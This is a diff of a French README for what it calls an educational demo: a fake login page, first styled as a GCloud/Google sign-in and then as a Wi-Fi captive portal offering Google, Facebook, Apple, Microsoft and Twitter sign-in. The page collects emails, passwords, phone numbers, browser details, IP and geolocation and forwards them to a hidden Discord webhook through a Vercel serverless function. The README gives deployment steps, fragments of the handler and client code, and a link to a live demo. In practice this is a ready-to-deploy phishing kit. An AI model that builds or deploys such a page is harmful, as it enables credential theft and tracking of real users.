@@ -1,83 +1,81 @@
-# 🌐 GCloud Connexion – Démo Éducative
+# 🌐 Portail Wi-Fi – Démo Éducative
 
-Ce projet est une **fausse page de connexion GCloud** à but **strictement pédagogique**. Il sert à montrer comment collecter certaines données côté client (navigateur, IP, géo) et les envoyer à un webhook Discord.
+Ce projet est une **fausse page de connexion pour un portail Wi-Fi** à but **strictement pédagogique**.  
+Il illustre comment collecter certaines données côté client (navigateur, IP, géolocalisation) et les transmettre à un webhook Discord.
 
-> ⚠️ Ce projet ne fait aucune vraie authentification. Il est à **usage éducatif uniquement**.
-
----
-
-## ✨ Fonctionnalités
-
-- Interface UI inspirée de Google
-- Collecte côté client :
-  - Email et mot de passe (fictifs)
-  - Infos navigateur (agent, langue, fuseau, résolution…)
-  - IP et géolocalisation approximative via [ipapi.co](https://ipapi.co/json)
-- Envoi des données dans un **webhook Discord** sécurisé via variable d’environnement
-- Déploiement automatique avec [Vercel](https://vercel.com)
+> ⚠️ **Attention** : aucune authentification réelle n’est effectuée. Usage uniquement éducatif.
 
 ---
 
-## 🛠️ Tech Stack
+## ✨ Fonctionnalités principales
 
-- HTML / CSS / JS pur
-- API Web natives (`fetch`, `navigator`, etc.)
-- [ipapi.co](https://ipapi.co/json) pour l’IP et géolocalisation
-- Hébergement via [Vercel](https://vercel.com)
+- Interface moderne, épurée et responsive adaptée à un portail Wi-Fi  
+- Collecte côté client :  
+  - Adresse e-mail, mot de passe (fictifs) et numéro de téléphone  
+  - Informations navigateur (user-agent, langue, fuseau horaire, résolution écran…)  
+  - IP publique et géolocalisation approximative via [ipapi.co](https://ipapi.co/json)  
+- Simulation de connexion via plusieurs méthodes (Google, Facebook, Apple, Microsoft, Twitter)  
+- Transmission sécurisée des données via un webhook Discord configuré en variable d’environnement  
+- Déploiement simple et automatisé avec [Vercel](https://vercel.com)
 
 ---
 
-## 🚀 Déploiement (Vercel)
+## 🛠️ Technologies utilisées
 
-### 1. Cloner le repo
+- HTML, CSS et JavaScript natifs (sans framework)  
+- API Web natives (`fetch`, `navigator`)  
+- Service tiers [ipapi.co](https://ipapi.co/json) pour récupération IP/géolocalisation  
+- Backend minimal via API Serverless sur Vercel pour sécuriser le webhook
+
+---
+
+## 🚀 Déploiement sur Vercel
+
+### 1. Cloner ce dépôt
 
 ```bash
-git clone https://github.com/PariaHRZ/gcloud-login
+git clone https://github.com/PariaHRZ/gcloud-login.git
 cd gcloud-login
-```
+````
 
-### 2. Déployer avec Vercel
+### 2. Déployer sur Vercel
 
-1. Va sur [vercel.com](https://vercel.com)
-2. Connecte ton compte GitHub
-3. Clique sur **"Add New → Project"**
-4. Sélectionne le repo
-5. Va dans l’onglet **Environment Variables** et ajoute :
+* Connecte-toi sur [vercel.com](https://vercel.com)
+* Connecte ton compte GitHub et importe ce projet
+* Dans la section **Environment Variables**, ajoute la variable suivante :
 
-| Nom de la variable      | Valeur (exemple)                        |
-|-------------------------|-----------------------------------------|
-| `DISCORD_WEBHOOK_URL`   | `https://discord.com/api/webhooks/...` |
+| Nom                   | Valeur (exemple)                            |
+| --------------------- | ------------------------------------------- |
+| `DISCORD_WEBHOOK_URL` | `https://discord.com/api/webhooks/xxxxxxxx` |
 
-6. Lance le déploiement ✅
-
-Ton site sera accessible à une URL comme :
-```
-https://ton-projet.vercel.app
-```
+* Lancer le déploiement
+* L’application sera accessible via une URL du type :
+  `https://ton-projet.vercel.app`
 
 ---
 
-## 📦 Lancer en local
+## 📦 Exécution locale
 
 ```bash
-git clone https://github.com/PariaHRZ/gcloud-login
+git clone https://github.com/PariaHRZ/gcloud-login.git
 cd gcloud-login
-open index.html  # ou double-clique dessus
+open index.html  # ou double-clique simplement sur le fichier
 ```
 
-⚠️ En local, le webhook Discord **ne fonctionnera pas** sans backend intermédiaire.
+> ⚠️ Le webhook Discord ne fonctionnera pas en local sans backend.
 
 ---
 
 ## 🔒 Sécurité du webhook
 
-Le webhook Discord est **stocké dans une variable d’environnement** (`DISCORD_WEBHOOK_URL`) sur Vercel, et **jamais exposé dans le code HTML/JS**.
+Le webhook Discord est **stocké uniquement dans une variable d’environnement côté serveur** (`DISCORD_WEBHOOK_URL`).
+Il **n’apparaît jamais dans le code client**, ce qui évite toute fuite d’information.
 
-L’envoi se fait vers une API Vercel (serverless function) sécurisée.
+L’envoi des données est fait via une fonction API Vercel serverless sécurisée.
 
 ---
 
-## 📁 Exemple d’API (à mettre dans `/api/webhook.js`)
+## 📁 Exemple de fonction API (fichier `/api/webhook.js`)
 
 ```js
 export default async function handler(req, res) {
@@ -94,7 +92,7 @@ export default async function handler(req, res) {
 }
 ```
 
-Et côté client dans ton JS :
+### Côté client (JS)
 
 ```js
 fetch("/api/webhook", {
@@ -108,15 +106,15 @@ fetch("/api/webhook", {
 
 ## 📄 Licence
 
-[MIT – libre d’adaptation à des fins pédagogiques.](https://github.com/PariaHRZ/gcloud-login/blob/main/LICENSE)
+Ce projet est sous licence [MIT](https://github.com/PariaHRZ/gcloud-login/blob/main/LICENSE), libre d’adaptation pour usage pédagogique uniquement.
 
 ---
 
-## 🔗 Démo
+## 🔗 Démo en ligne
 
-🔗 [https://gcloud-login-git-main-pariahrzs-projects.vercel.app/](https://gcloud-login-git-main-pariahrzs-projects.vercel.app/)
+[https://gcloud-login-git-main-pariahrzs-projects.vercel.app/](https://gcloud-login-git-main-pariahrzs-projects.vercel.app/)
 
-OU
+---
 
-<img src="https://github.com/user-attachments/assets/632e655f-7d6c-43ad-b329-03e0f32c0be0" width="450"/>
-
+<img src="https://github.com/user-attachments/assets/632e655f-7d6c-43ad-b329-03e0f32c0be0" alt="Capture d'écran portail Wi-Fi" width="450" />
+```
